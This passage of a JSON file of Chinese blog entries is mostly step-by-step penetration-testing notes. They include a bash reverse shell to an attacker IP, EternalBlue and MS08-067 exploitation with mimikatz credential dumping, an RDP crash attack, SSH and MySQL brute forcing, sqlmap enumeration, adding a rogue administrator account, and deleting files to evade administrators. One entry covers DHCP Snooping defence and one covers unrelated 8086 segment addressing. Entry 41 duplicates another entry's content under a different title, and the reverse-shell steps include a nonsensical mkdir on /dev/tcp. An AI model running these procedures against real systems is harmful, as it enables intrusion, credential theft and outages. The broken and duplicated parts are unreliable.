    "content": "<h2>反向 Shell 远程控制实验（Kali 攻击 CentOS）</h2><h3>原理简述</h3><p>受害人运行骇客脚本后，向攻击者主机开放连接并建立反向 shell，攻击者可获取对方终端控制权。</p><h3>实验环境</h3><ul><li><strong>攻击者：</strong> Kali 2022</li><li><strong>受害者：</strong> CentOS 7</li></ul><h3>攻击端操作（Kali）</h3><pre><code>nc -lvp &lt;监听端口&gt;</code></pre><p>监听指定端口，等待受害者连接。<br>监听后该终端将无法继续执行其他命令。</p><pre><code>netstat -ntlp</code></pre><p>确认端口是否成功监听。</p><h3>受害端操作（CentOS）</h3><p>假设用户运行了以下恶意脚本：</p><pre><code>mkdir -p /dev/tcp/&lt;攻击者IP&gt;<br>bash -i &gt;&amp; /dev/tcp/&lt;攻击者IP&gt;/&lt;监听端口&gt; 0&gt;&amp;1</code></pre><p>此命令会向攻击者发起连接，并将 bash 会话输入输出映射到攻击者的 Netcat 端口。</p><h3>控制演示</h3><p>此时攻击者终端将接收到一个模拟的受害者 bash 终端。</p><p>例如执行：</p><pre><code>shutdown -P now</code></pre><p>将会立即关机受害者机器。</p><h3>警告</h3><p><strong>本实验仅限于合法授权的测试与学习，切勿在未授权系统上使用。</strong></p>",
    "type": 3
  },
  {
    "id": 39,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "NMAP网络扫描工具使用",
    "content": "<h2>Nmap 常用扫描命令与说明</h2><h3>1. Ping 扫描</h3><pre><code>nmap -sP &lt;网段&gt;/&lt;掩码&gt;</code></pre><p>快速扫描指定网段，识别在线主机。</p><p><strong>返回数据：</strong>IP、回应延迟、MAC 地址</p><h3>2. 半开放式 TCP 扫描（默认）</h3><pre><code>nmap &lt;地址&gt;</code></pre><p>速度快、隐蔽性好、精度适中。</p><p><strong>握手次数：</strong>2 次</p><p><strong>返回数据：</strong>端口、协议、状态、服务名</p><h3>3. 指定端口扫描</h3><pre><code>nmap -p &lt;端口&gt; &lt;IP地址&gt;</code></pre><p>扫描目标指定端口（可多个）。</p><p><strong>握手次数：</strong>2 次</p><p><strong>返回数据：</strong>端口、协议、状态、服务名</p><h3>4. 完整 TCP 连接扫描</h3><pre><code>nmap -sT &lt;IP地址&gt;</code></pre><p>完整三次握手，精度高但速度慢。</p><p><strong>握手次数：</strong>3 次</p><p><strong>返回数据：</strong>端口、协议、状态、服务名</p><h3>5. 半开放式 TCP 扫描（SYN 扫描）</h3><pre><code>nmap -sS &lt;IP地址&gt;</code></pre><p>默认使用，速度快且隐蔽性好。</p><p><strong>握手次数：</strong>2 次</p><p><strong>返回数据：</strong>端口、协议、状态、服务名</p><h3>6. UDP 扫描</h3><pre><code>nmap -sU &lt;IP地址&gt;</code></pre><p>扫描目标所有开放的 UDP 端口。</p><p><strong>握手次数：</strong>null（UDP 无连接）</p><p><strong>返回数据：</strong>端口、协议、状态、服务名</p><h3>7. 操作系统探测</h3><pre><code>nmap -O &lt;IP地址&gt;</code></pre><p>通过 TTL 与回应行为推测系统类型与版本。</p><p><strong>握手次数：</strong>null</p><p><strong>返回数据：</strong>端口、协议、状态、服务名<br>操作系统、版本猜测、网络距离</p><h3>8. 高级详细扫描</h3><pre><code>nmap -A &lt;IP地址&gt;</code></pre><p>获取目标主机的所有服务信息及系统信息。</p><p><strong>握手次数：</strong>unknown</p><p><strong>返回数据：</strong>端口、协议、状态、服务名、服务版本、系统内核、系统版本、主机名、NetBIOS、域名、系统时间等。</p>",
    "type": 3
  },
  {
    "id": 40,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "MS17_010 永恒之蓝漏洞",
    "content": "<h2>永恒之蓝（MS17-010）漏洞利用流程</h2><h3>概述</h3><p><strong>漏洞平台：</strong>Windows 系统<br><strong>涉及端口：</strong>445 / 139<br><strong>涉及服务：</strong>SMB<br><strong>攻击方式：</strong>通过 Metasploit Framework（MSF）渗透</p><h3>一、漏洞检测（Exploit 模块）</h3><pre><code>search 17_010</code></pre><p>搜索是否存在永恒之蓝检测脚本，例如：<code>auxiliary/scanner/smb/smb_ms17_010</code></p><pre><code>use auxiliary/scanner/smb/smb_ms17_010</code></pre><p>调用该检测模块</p><pre><code>show options</code></pre><p>查看参数（Required 表示是否必填）</p><pre><code>set RHOSTS &lt;目标IP&gt;<br>run</code></pre><p>执行漏洞检测并输出结果</p><h3>二、漏洞利用（Payload 模块）</h3><pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre><p>使用漏洞利用模块</p><pre><code>set RHOSTS &lt;目标IP&gt;<br>run</code></pre><p>执行漏洞攻击，获取会话</p><h3>三、信息窃取（Post 模块）</h3><pre><code>sysinfo</code></pre><p>查看目标系统基本信息</p><pre><code>load mimikatz</code></pre><p>加载 <code>mimikatz</code> 模块（破解用户凭证）</p><pre><code>creds_all</code></pre><p>列出目标主机所有当前登录用户及其密码（需目标有登录会话）</p><h3>⚠️警告</h3><p><strong>本行为仅限合法授权的渗透测试与教学目的，严禁用于非法攻击。</strong></p>",
    "type": 3
  },
  {
    "id": 41,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "MFS(Metasploit Framework)攻击工具集成平台使用",
    "content": "<h2>永恒之蓝（MS17-010）漏洞利用流程</h2><h3>概述</h3><p><strong>漏洞平台：</strong>Windows 系统<br><strong>涉及端口：</strong>445 / 139<br><strong>涉及服务：</strong>SMB<br><strong>攻击方式：</strong>通过 Metasploit Framework（MSF）渗透</p><h3>一、漏洞检测（Exploit 模块）</h3><pre><code>search 17_010</code></pre><p>搜索是否存在永恒之蓝检测脚本，例如：<code>auxiliary/scanner/smb/smb_ms17_010</code></p><pre><code>use auxiliary/scanner/smb/smb_ms17_010</code></pre><p>调用该检测模块</p><pre><code>show options</code></pre><p>查看参数（Required 表示是否必填）</p><pre><code>set RHOSTS &lt;目标IP&gt;<br>run</code></pre><p>执行漏洞检测并输出结果</p><h3>二、漏洞利用（Payload 模块）</h3><pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre><p>使用漏洞利用模块</p><pre><code>set RHOSTS &lt;目标IP&gt;<br>run</code></pre><p>执行漏洞攻击，获取会话</p><h3>三、信息窃取（Post 模块）</h3><pre><code>sysinfo</code></pre><p>查看目标系统基本信息</p><pre><code>load mimikatz</code></pre><p>加载 <code>mimikatz</code> 模块（破解用户凭证）</p><pre><code>creds_all</code></pre><p>列出目标主机所有当前登录用户及其密码（需目标有登录会话）</p><h3>⚠️警告</h3><p><strong>本行为仅限合法授权的渗透测试与教学目的，严禁用于非法攻击。</strong></p>",
    "type": 3
  },
  {
    "id": 42,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "MS08_067 SMB漏洞",
    "content": "<h2>MS08-067 Windows SMB 漏洞利用流程（Metasploit）</h2><h3>1. 启动 Metasploit</h3><pre><code>msfconsole</code></pre><p>进入 MSF 控制台。</p><h3>2. 漏洞模块搜索</h3><pre><code>search 08_067</code></pre><p>查找与 MS08-067 漏洞相关的模块。</p><h3>3. 使用漏洞模块</h3><pre><code>use exploit/windows/smb/ms_08_067</code></pre><p>调用该模块准备执行漏洞攻击。</p><h3>4. 设置目标参数</h3><pre><code>set RHOSTS &lt;目标IP&gt;</code><br><code>show targets</code></pre><p>查看支持的目标操作系统列表，获取目标系统对应的编号。</p><pre><code>set TARGET &lt;目标编号&gt;</code></pre><p>选择对应的操作系统版本（需精准匹配，否则攻击可能失败）。</p><h3>5. 可选步骤 - 检测漏洞</h3><pre><code>check</code></pre><p>检测目标是否存在该漏洞。出现绿色 <code>[+]</code> 表示存在。</p><h3>6. 执行漏洞利用</h3><pre><code>exploit</code></pre><p>开始攻击，等待返回 <code>meterpreter &gt;</code> 即表示获得目标主机会话（攻击成功）。</p><h3>⚠️ 注意事项</h3><ul><li><strong>set RHOSTS</strong> 用于设置目标主机 IP。</li><li><strong>set TARGET</strong> 参数需根据 <code>show targets</code> 列表中实际编号设定。</li><li><code>check</code> 为可选但推荐执行。</li><li>仅限在<strong>授权环境</strong>中操作，切勿用于非法用途。</li></ul>",
    "type": 3
  },
  {
    "id": 43,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "ARPING、FPING、NMAP网络扫描工具使用",
    "content": "<h2>ARPING / FPING / Nmap 网络扫描命令整理</h2><h3>ARPING</h3><ul><li><strong>协议：</strong>ARP</li><li><strong>特点：</strong>不能跨网段，只能在同网段使用</li></ul><pre><code>arping &lt;IP&gt;</code></pre><p>使用 ARP 协议 ping IP，返回目标机器 MAC 地址</p><p><strong>常用参数：</strong></p><pre><code>-c &lt;数字&gt;      # 发包次数<br>-i &lt;网卡&gt;      # 指定网卡<br>-d             # 检测 ARP 欺骗<br>-b             # 不断发送 ARP 包</code></pre><pre><code>netdiscover -r &lt;网段&gt;/&lt;掩码&gt;</code></pre><p>扫描整个网段内活动主机</p><h3>FPING</h3><ul><li><strong>协议：</strong>ICMP + ARP</li></ul><pre><code>fping &lt;IP&gt;</code></pre><p>判断主机是否在线，可一次检测多个 IP</p><pre><code>fping -g &lt;start_IP&gt; &lt;end_IP&gt;</code><br><code>fping -g &lt;网段&gt;/&lt;掩码&gt;</code></pre><p>扫描 IP 段</p><pre><code>-ag     # 仅显示在线地址<br>-ug     # 仅显示离线地址<br>-s      # 显示统计信息<br>-q      # 静默模式，只显示结果</code></pre><h3>Nmap</h3><ul><li><strong>协议：</strong>TCP / UDP / ICMP</li><li><strong>特点：</strong>支持多协议、端口和服务扫描</li></ul><pre><code>nmap [选项] &lt;IP&gt;</code></pre><p><strong>常用参数：</strong></p><pre><code>-sn                     # PING 扫描，仅检测主机是否在线<br>-pPORT1,PORT2,...      # 扫描指定端口，多个端口逗号隔开<br>-sT                    # TCP 全连接扫描<br>-sS                    # TCP 半开放扫描（更快更隐蔽）<br>-sU                    # UDP 扫描（但不准确）<br>-sV -pPORTS &lt;IP&gt;       # 扫描端口的服务版本<br>-O                     # 猜测操作系统（基于 TTL）<br>-A                     # 扫描所有系统信息（综合分析）</code></pre><pre><code>nmap -pPORT --script=SCRIPT &lt;IP&gt;</code></pre><p>使用 NSE 脚本扫描指定端口的漏洞（脚本目录：<code>/usr/share/nmap/scripts</code>）</p><pre><code>nmap --script=字符* &lt;IP&gt;</code></pre><p>使用所有以指定前缀开头的脚本</p>",
    "type": 3
  },
  {
    "id": 44,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "MS12_020 RDP拒绝服务攻击",
    "content": "<h2>MS12-020 漏洞（Windows RDP 拒绝服务攻击）</h2><h3>🎯 漏洞信息</h3><ul><li><strong>漏洞编号：</strong>MS12-020</li><li><strong>针对服务：</strong>Windows 远程桌面服务（RDP）</li><li><strong>默认端口：</strong>3389</li><li><strong>攻击后果：</strong>目标主机直接蓝屏崩溃</li></ul><h3>🔎 漏洞侦测</h3><pre><code>use auxiliary/scanner/rdp/ms12_020_check<br>set RHOSTS &lt;目标IP&gt;<br>run</code></pre><p><strong>说明：</strong>该脚本用于<strong>检测</strong>目标是否存在 MS12-020 漏洞。若返回 <code>The target is vulnerable</code>，表示目标存在漏洞。</p><h3>💥 漏洞攻击</h3><pre><code>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<br>set RHOSTS &lt;目标IP&gt;<br>exploit</code></pre><p>该脚本直接触发 RDP 拒绝服务漏洞，导致目标系统蓝屏。</p><h3>🛡️ 安全加固建议</h3><ol><li>客户端按下 <code>Win + R</code>，输入 <code>services.msc</code>，找到并停止 <strong>Remote Desktop Services</strong> 服务。</li><li>安装 Microsoft 提供的官方漏洞补丁，修复 MS12-020。</li></ol><p><strong>⚠️ 注意：</strong>此漏洞危害极大，建议立即加固已暴露至公网的 Windows RDP 服务。</p>",
    "type": 3
  },
  {
    "id": 45,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "密码爆破：穷举爆破",
    "content": "<h2>MySQL 密码穷举爆破（MSF / Hydra）</h2><h3>🎯 目标服务</h3><ul><li><strong>服务类型：</strong>MySQL 数据库</li><li><strong>工具：</strong>Metasploit（MSF）、Hydra</li></ul><h3>🛠️ 使用 MSF 进行爆破</h3><p><strong>模块路径：</strong>auxiliary/scanner/mysql/mysql_login</p><pre><code>use auxiliary/scanner/mysql/mysql_login<br>set USERNAME &lt;用户名&gt;<br>set RHOSTS &lt;目标IP&gt;<br>set PASS_FILE &lt;密码字典路径&gt;   # 例如：/usr/share/wordlists/fasttrack.txt<br>run</code></pre><p><strong>说明：</strong>逐个使用字典中的密码尝试登录目标 MySQL 用户。</p><h3>🛠️ 使用 Hydra 进行爆破</h3><pre><code>hydra -l &lt;用户名&gt; -P &lt;密码字典路径&gt; mysql://&lt;目标IP&gt; -t &lt;线程数&gt;</code></pre><p><strong>参数解释：</strong></p><ul><li><code>-l</code>：指定用户名</li><li><code>-P</code>：密码字典</li><li><code>mysql://</code>：目标服务类型和地址</li><li><code>-t</code>：指定并发线程数（越大越快但越容易被防火墙发现）</li></ul><h3>⚠️ 注意</h3><ul><li>避免高频攻击引发目标封锁。</li><li>确保测试仅在授权环境中进行。</li></ul>",
    "type": 3
  },
  {
    "id": 46,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "针对SSH服务的密码爆破",
    "content": "<h2>SSH 密码穷举破解（MSF / Hydra）</h2><h3>🎯 涉及服务</h3><ul><li><strong>服务类型：</strong>SSH</li><li><strong>攻击方式：</strong>穷举密码破解</li><li><strong>工具：</strong>Metasploit Framework（MSF）、Hydra</li></ul><h3>🛠️ 使用 MSF 爆破</h3><p><strong>模块路径：</strong>auxiliary/scanner/ssh/ssh_login</p><pre><code>use auxiliary/scanner/ssh/ssh_login<br>set RHOSTS &lt;目标IP&gt;<br>set USERNAME &lt;用户名&gt;<br>set PASS_FILE &lt;密码字典路径&gt;     # 例如：/usr/share/wordlists/fasttrack.txt<br>set THREADS &lt;线程数&gt;              # 可选项<br>run</code></pre><p><strong>说明：</strong>执行 <code>run</code> 后，出现绿色 <code>[+]</code> 表示成功破解，可从输出信息中查看登录密码。</p><h3>🛠️ 使用 Hydra 爆破</h3><pre><code>hydra -l &lt;用户名&gt; -P &lt;密码字典路径&gt; ssh://&lt;目标IP&gt; -t &lt;线程数&gt;</code></pre><ul><li><code>-l</code>：指定用户名</li><li><code>-P</code>：指定密码字典</li><li><code>ssh://&lt;IP&gt;</code>：目标主机地址</li><li><code>-t</code>：并发线程数，过高可能导致连接失败</li></ul><h3>⚠️ 注意事项</h3><ul><li>请在授权的测试环境中使用此方法。</li><li>针对 SSH 的暴力破解容易被防火墙识别封锁，请适当设置延时或线程数。</li></ul>",
    "type": 3
  },
  {
    "id": 47,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "信息采集工作后保存数据到本地",
    "content": "<h2>Metasploit 下载被控主机 systeminfo 信息</h2><h3>🖥️ 在 shell 中执行：</h3><pre><code>systeminfo &gt; 盘符:\\path\\file</code></pre><p>将 <code>systeminfo</code> 命令的输出信息保存至目标主机的指定路径文件中，例如：</p><pre><code>systeminfo &gt; C:\\Users\\Public\\sysinfo.txt</code></pre><h3>💾 回到 MSF 命令行：</h3><pre><code>download 盘符:\\path\\file 本地目录</code></pre><p>将目标主机上的信息文件下载到攻击者本地目录，例如：</p><pre><code>download C:\\Users\\Public\\sysinfo.txt /home/kali/Desktop/</code></pre><h3>🧹 清除痕迹：</h3><pre><code>rm 盘符:\\path\\file</code></pre><p>删除被控主机上生成的文件，避免被管理员发现：</p><pre><code>rm C:\\Users\\Public\\sysinfo.txt</code></pre><h3>⚠️ 注意</h3><ul><li>路径中的反斜杠 <code>\\</code> 在 Metasploit 中必须双写</li><li>确保目标主机对指定路径有写入权限</li></ul>",
    "type": 3
  },
  {
    "id": 48,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "利用SQLMap自动化SQL注入",
    "content": "<h2>sqlmap 自动 SQL 注入命令（获取数据库信息）</h2><h3>📌 基础说明</h3><ul><li><strong>sqlmap：</strong>开源自动化 SQL 注入测试工具</li><li><strong>作用：</strong>用于探测数据库、表、字段信息</li><li><strong>依赖：</strong>提供有效的目标 URL 和 cookie（若目标需要登录）</li></ul><h3>📥 获取数据库名</h3><pre><code>sqlmap -u \"&lt;注入参数后的完整URL&gt;\" --cookie \"&lt;document.cookie提取的cookie&gt;\" --dbs --batch</code></pre><p><strong>说明：</strong>获取目标主机中所有数据库名。</p><h3>📥 获取指定数据库下的所有表</h3><pre><code>sqlmap -u \"&lt;注入参数后的完整URL&gt;\" --cookie \"&lt;document.cookie提取的cookie&gt;\" --batch -D &lt;数据库名&gt; --tables</code></pre><p><strong>说明：</strong>列出指定数据库 <code>&lt;数据库名&gt;</code> 中的所有表名。</p><h3>📥 获取指定表的字段信息</h3><pre><code>sqlmap -u \"&lt;注入参数后的完整URL&gt;\" --cookie \"&lt;document.cookie提取的cookie&gt;\" --batch -D &lt;数据库名&gt; -T &lt;表名&gt; --columns</code></pre><p><strong>说明：</strong>列出数据库 <code>&lt;数据库名&gt;</code> 中表 <code>&lt;表名&gt;</code> 的所有字段名与字段类型。</p><h3>⚠️ 注意</h3><ul><li>URL 必须为实际触发注入的完整请求路径</li><li>cookie 必须有效，适用于登录后才可访问的页面</li><li><code>--batch</code> 参数用于跳过所有确认提示，实现自动化执行</li></ul>",
    "type": 3
  },
  {
    "id": 49,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "利用Crunch工具生成供密码破解的密码字典",
    "content": "<h2>Crunch：密码字典生成工具</h2><p><strong>作用：</strong>基于给定字符集与长度生成所有可能组合的密码字典。</p><h3>🔢 基础排列组合</h3><pre><code>crunch &lt;min len&gt; &lt;max len&gt; &lt;string&gt;</code></pre><p>使用 <code>&lt;string&gt;</code> 中的字符生成从 <code>min len</code> 到 <code>max len</code> 所有可能的排列组合。例如：</p><pre><code>crunch 3 5 abc</code></pre><p>将生成由 a、b、c 构成，长度 3 到 5 的所有组合。</p><h3>🔧 模板组合（使用通配符）</h3><ul><li><code>&amp;</code>：替换为数字 0~9</li><li><code>@</code>：替换为小写字母 a~z</li><li><code>,</code>：替换为大写字母 A~Z</li><li><code>^</code>：替换为特殊字符（如 !@#$% 等）</li></ul><pre><code>crunch 4 4 -t @@12</code></pre><p>示例输出：aa12、ab12、ac12 …… 到 zz12。</p><pre><code>crunch 4 4 -t pass^^^^</code></pre><p>示例输出：pass!!!!、pass!\"#$ …… 等所有特殊字符组合。</p><h3>📦 输出到文件</h3><pre><code>crunch &lt;min len&gt; &lt;max len&gt; -o &lt;filename&gt;</code></pre><p>将生成的结果写入到指定文件中，例如：</p><pre><code>crunch 4 4 123abc -o mydict.txt</code></pre><h3>⚠️ 注意事项</h3><ul><li>过大的长度或字符集可能导致字典过大，占用大量内存和硬盘。</li><li>可搭配 <code>head</code>、<code>more</code> 命令预览字典。</li></ul>",
    "type": 3
  },
  {
    "id": 50,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "渗透之后的信息采集工作",
    "content": "<h2>入侵后信息收集与持久化控制（Metasploit）</h2><h3>1. 基础信息收集</h3><pre><code>sysinfo</code></pre><p>查看目标系统版本、架构、主机名等基本信息。</p><h3>2. 获取用户凭据</h3><pre><code>load mimikatz</code></pre><p>加载 <code>mimikatz</code> 模块，用于凭证抓取。</p><pre><code>creds_all</code></pre><p>依赖 <code>mimikatz</code>，提取当前系统中缓存的用户名、密码、哈希等。</p><h3>3. 启用远程桌面</h3><pre><code>run getgui -e</code></pre><p>启用目标主机的远程桌面服务。</p><h3>4. 进入命令行与提权</h3><pre><code>shell</code></pre><p>切换到目标系统的 <code>cmd</code> 交互界面。</p><pre><code>chcp 65001</code></pre><p>设置终端编码为 UTF-8，防止中文乱码。</p><pre><code>net user &lt;username&gt; &lt;password&gt; /add</code></pre><p>新增一个本地用户。</p><pre><code>net localgroup administrators &lt;username&gt; /add</code></pre><p>将该用户添加至管理员组，完成本地提权。</p><h3>5. 远程桌面连接</h3><pre><code>rdesktop &lt;IP&gt;</code></pre><p>攻击端通过 <code>rdesktop</code> 工具远程连接至目标主机。</p>",
    "type": 3
  },
  {
    "id": 51,
    "updateDate": "2025年5月18日",
    "specificTtime": "19点58分",
    "title": "段寄存器和段式寻址",
    "content": "<h2>段寄存器和段式寻址</h2><p>段式寻址是一个从内存中访问内存地址的方式，该寻址方式诞生于intel推出 8086 CPU之后，因为8086有一个与众不同的地方：它有20条地址线，也就是20位宽，这意味着它可以访问2的20次方（1,048,576字节 = 1MB）的数据。但问题在于寄存器都是16位宽的，这意味着这些寄存器最大只能访问64KB字节的内存。</p><p>CPU将通过计算，将原本16位宽的内存通过左移4位以合成为20位宽，再加上偏移量（大多数情况下都为<code>0</code>），这样就可以访问的了20位宽的8086CPU可以访问的所有1MB内存。</p><p>段式寻址的作用不小，例如从磁盘读取系统内核到内存中，<code>0x10000</code>是内核常见的存放位置，如果不用段式寻址，将无法进行操作。除此之外，从磁盘读取数据、设置栈和其他需要访问的内存位置大于64kb的，都将用得上段式寻址。</p><p>为了实现这一效果，我们分别需要为段寄存器和段偏移量提供值，段寄存器的值应当是：我们要访问的内存位置除以16（后面将介绍为什么），段偏移量的值大多数情况下为0。</p><p>CPU遵循这个公式来算出我们要访问的内存地址：<code>将访问的内存地址 = 段寄存器的值 x 16 + 段偏移量</code>（即将16位宽内存位置左移4位合成为20位宽内存位置 + 段偏移量），你能看得到它会自己在段寄存器的值，也就是我们实际要访问的内存位置的基础上乘以16，这就是为什么我们提供给段寄存器的值，应当是我们要访问的内存位置再去除以16的原因。</p><p><strong>实现 / 设置段寄存器的值</strong></p><pre><code>mov ax, 实际要访问的内存地址 / 16    ; 设置要访问的内存地址<br>mov ds, ax                         ; 将值传给段寄存器</code></pre><p>顺带一提，不能直接将值赐予<code>ds</code>，必须中转。</p><p><strong>实现 / 设置段偏移量的值</strong></p><pre><code>mov si, 0x0000   ; 偏移量大多数情况下为0，因此赐予0x0000</code></pre><p><strong>实现 / 获取返回值</strong></p><pre><code>mov 寄存器, [si]      ; 寄存器具体是什么取决于目标内存位置的数据类型<br>mov 寄存器, [si + 1]  ; 也可以这样来获取下一个字段，以此类推</code></pre><p>结束。</p>",
    "type": 0
  },
  {
    "id": 52,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "DHCP Snooping攻击与防范",
    "content": "<h2>Kali 伪造 DHCP Server 攻击与防范</h2><p><strong>实验目的：</strong>通过 Kali2019 虚拟机模拟非法 DHCP Server 干扰真实网络配置，并通过 DHCP Snooping 实现防御。</p><h3>一、合法 DHCP Server 配置</h3><p><strong>拓扑：</strong>三层路由器充当合法 DHCP Server，PC 设置为 DHCP 自动获取 IP</p><pre><code>dhcp enable<br>ip pool huawei<br>network 192.168.197.0<br>gateway-list 192.168.197.254</code></pre><p>进入下行接口配置 DHCP 功能：</p><pre><code>interface &lt;下行口&gt;<br>dhcp select global</code></pre><p>此时，PC 会正常通过合法 DHCP 获取地址</p><h3>二、Kali2019 发起攻击</h3><p>启动 Kali 虚拟机，将网卡设为 vmnet8，与云环境一致</p><pre><code>yersinia -G</code></pre><p>进入 GUI 后选择：<br><code>Launch attack → DHCP</code></p><ul><li><strong>Raw packet：</strong>发送任意自构报文</li><li><strong>Discover packet：</strong>模拟客户端获取地址</li><li><strong>DHCP rogue server：</strong>启动伪造 DHCP Server</li><li><strong>Release packet：</strong>向合法 DHCP Server 发送释放请求</li></ul><p>选择：<code>sending discover packet</code> 并确认，Kali 将发起大量请求导致 PC 无法获取 IP，Ping 网关失败，网络变慢。</p><h3>三、防范方法：DHCP Snooping</h3><p><strong>在二层交换机配置如下：</strong></p><pre><code>interface &lt;连接合法 PC 的端口&gt;<br>dhcp snooping enable</code></pre><pre><code>interface &lt;连接合法路由器的上行端口（trunk）&gt;<br>dhcp snooping trust</code></pre><p>说明：</p><ul><li>未标为 trusted 的端口收到 DHCP Server 报文将直接被丢弃</li><li>确保合法 DHCP Server 所在接口已配置 trusted</li></ul><p><strong>效果：</strong>非法 DHCP Server（如 Kali）即使尝试广播报文，也无法干扰正常设备获取 IP 地址。</p>",
    "type": 2
  }
]
